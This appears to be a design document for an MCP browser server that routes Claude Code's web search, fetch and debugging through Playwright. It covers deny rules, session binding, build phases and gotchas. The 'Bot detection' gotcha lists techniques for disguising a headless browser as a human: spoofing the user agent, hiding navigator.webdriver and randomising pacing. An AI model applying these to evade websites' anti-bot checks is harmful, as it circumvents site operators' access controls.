are secrets (600, gitignored). This is the concrete cover for the
"authenticated sessions" gap noted under § Default browser for debugging.

**Binding is visible, not ambient (2026-07-28, ledger DEC-2026-07-28).**
`session_login` / `session_solve_challenge` / `session_attach` rebind the shared
upstream browser (`src/upstream.ts`), so every later `browser_*` call is
authenticated. That convenience stays — it is what makes "log in once" cover
interactive debugging — but it is no longer silent: `withSessionBanner()`
(`src/index.ts`, exported and unit-tested) appends a one-line notice to every
`browser_*` result while a session is bound. This is MCP 2026-07-28's "mint an
explicit handle the model can see" guidance applied to the one piece of state
here that the model could not see. The named-artifact flow
(`web_fetch({url, session})`) already followed it. **The remote surface gets a
name-free notice** — it shares the browser but cannot rebind it (`session_*` is
denylisted), so the session name is never disclosed to a prompt-injectable client.

## Overriding native WebSearch / WebFetch

Add deny rules to `~/.claude/settings.json` (user level — applies in every project):

```json
{
  "permissions": {
    "deny": ["WebSearch", "WebFetch"]
  }
}
```

With the built-ins denied and `web_search`/`web_fetch` available from a user-scope
MCP server, Claude Code routes web access through Playwright. Verify after install:
ask Claude to search for something and confirm the tool call is
`mcp__playwright-mcp__web_search`.

Also add to user-level memory/instructions (`~/.claude/CLAUDE.md`):
"Use playwright-mcp's web_search/web_fetch for all web access; use its browser
tools for reviewing local and remote sites."

## Default browser for debugging — replacing the claude-in-chrome plugin

The claude-in-chrome extension can't literally be swapped out (it's a browser
extension in the user's real Chrome, not an MCP registration we control). The
resolution is to make it *unreachable* and make playwright-mcp the only browser
path Claude has. Three layers, applied together:

**1. Hard block — deny the extension's tools.** In `~/.claude/settings.json`:

```json
{
  "permissions": {
    "deny": ["WebSearch", "WebFetch", "mcp__claude-in-chrome"]
  }
}
```

A server-level rule (`mcp__claude-in-chrome`, no tool suffix) denies every tool
the extension exposes. With those denied and playwright-mcp present at user
scope, browser work has exactly one route.

**2. Steer — user-level directive.** In `~/.claude/CLAUDE.md`:

> Use playwright-mcp for ALL browser work: reviewing and debugging local dev
> servers (localhost/127.0.0.1) and live sites, screenshots, and web search/fetch.
> Never use the claude-in-chrome browser extension tools. Clean up temporary
> screenshots and files at the end of every debug session.

(The cleanup sentence carries over odyssey-alive's existing hygiene rule.)

**3. Cover the gap — authenticated sessions.** The one thing claude-in-chrome
provides that headless playwright doesn't is the user's real logged-in Chrome
session. Cover it with playwright-mcp's persistent profile (`userDataDir`) plus
`secrets.env` credential filling — log in once through a headed run
(`--headed` flag or a `browser_login` helper), and the session cookie persists
for future headless runs. If a site defeats that (hardware 2FA, anti-bot), the
user can temporarily re-enable the extension by removing the deny rule for a
session — make the installer print how.

The installer applies layer 1 and offers layer 2, always with a prompt and a
diff before touching `~/.claude/settings.json` — never silently.

## Migration: odyssey-alive

After the user-scope server works:

1. Remove the `playwright` entry from odyssey-alive's project config:
   `claude mcp remove --scope project playwright` run inside `~/lab/odyssey-alive`
   (it lives in `~/.claude.json` under `projects./home/francis/lab/odyssey-alive.mcpServers`).
2. Update odyssey-alive's CLAUDE.md playwright rule to reference playwright-mcp.
3. Smoke-test in odyssey-alive: visual-debug a local page, do a web search, fetch
   a JS-heavy page.

## Build Phases

- **Phase 1 — Skeleton + wrap.** package.json, tsconfig, src/index.ts wrapping
  `@playwright/mcp` headless. Verify all upstream browser tools work via
  `claude mcp add` in a scratch project.
- **Phase 2 — Custom tools (build bottom-up, the three-layer stack).** First the
  shared modules (`browser.ts` stealth context, `extract.ts`, `score.ts`,
  `cache.ts`, `budget.ts`) and the per-engine scrapers (`engines/*.ts`). Then
  **`web_fetch`** (render + citations, HTML/PDF), then **`web_search`** (3-engine,
  calls web_fetch in confirm mode), then the **`deep_research`** tool (drives
  web_search links-mode + web_fetch). All share one browser lifecycle. Build the
  headed-vs-headless parity harness alongside the scrapers. Extend the smoke
  instructions assertion to require `web_search`/`web_fetch` in the capability map
  (the REPLACES NATIVE TOOLS line only renders once those tools exist).
- **Phase 2b — Research-paper orchestration.** Materialize the `research-paper`
  skill + its four AGENT.md files (thesis-builder, gap-analyst, citation-verifier,
  research-assistant), each persona run through the skill-builder Persona
  Assignment Gate, with the research-assistant included by construction. This is
  the session-side agent layer that turns `deep_research`'s raw material into the
  verified 1300–1500-word paper.
- **Phase 3 — Installers.** install.sh + install.ps1, idempotent, including the
  settings.json deny rules (with prompt + diff).
- **Phase 4 — Override + verify.** Apply deny rules, confirm WebSearch/WebFetch
  route through the MCP tools in a fresh session.
- **Phase 5 — Migrate odyssey-alive.** Remove project-scope server, update its
  CLAUDE.md, smoke-test.

## Gotchas

- **stdio discipline:** never `console.log` to stdout in the server — it corrupts
  the MCP stdio stream. Log to stderr.
- **Deferred tool schemas:** with ~28 tools, Claude Code may register only tool
  *names* and defer descriptions/schemas until the model runs ToolSearch. Tool
  descriptions alone are therefore unreliable for discovery — the server
  `instructions` field is the only always-visible surface (injected into the
  system prompt as "MCP Server Instructions"). Keep it under ~40 lines and
  generate it from the live toolset, never hand-maintain it. Host honoring of
  `instructions` is real today but not contractual — which is why all three
  discovery layers (tool descriptions, instructions map, CLAUDE.md steering
  directive) ship together rather than relying on any one.
- **Search-engine fragility:** scrapers break when result markup changes. Isolate
  each engine's extraction selectors in its own module section, and use the
  headed-vs-headless parity harness (see `/web-search-method`) as the regression
  check. Drift order: Google most often, Bing moderate, DuckDuckGo's
  `html.duckduckgo.com/html` endpoint least. The three engines are independent
  fail-soft sources — a blocked engine drops out and is annotated, it does not
  fail the tool.
- **Bot detection (stealth by design):** `web_search`/`web_fetch` deliberately
  disguise the headless context to pass as a real person — this reverses the
  earlier "don't escalate without need" guidance now that the need is explicit.
  Manual stealth layer first (launch arg `--disable-blink-features=AutomationControlled`,
  real UA with the `HeadlessChrome` token stripped, `addInitScript` zeroing
  `navigator.webdriver`, realistic locale/timezone/viewport, persistent profile,
  consent pre-seeding, jittered pacing). Do NOT add `playwright-extra`/stealth
  plugins — they wrap Playwright and collide with the exact-pinned `playwright`
  version; WebGL/canvas spoofing is escalation-only. Full method in
  `/web-search-method`.
- **Windows paths:** registration must use absolute paths with proper escaping;
  `claude mcp add` handles quoting better than hand-editing `~/.claude.json`.
- **npx vs pinned install:** unlike odyssey-alive's `npx @playwright/mcp@latest`,
  this repo pins the dependency — upgrades are deliberate (`npm update` + rebuild),
  so a bad upstream release can't break every project at once.
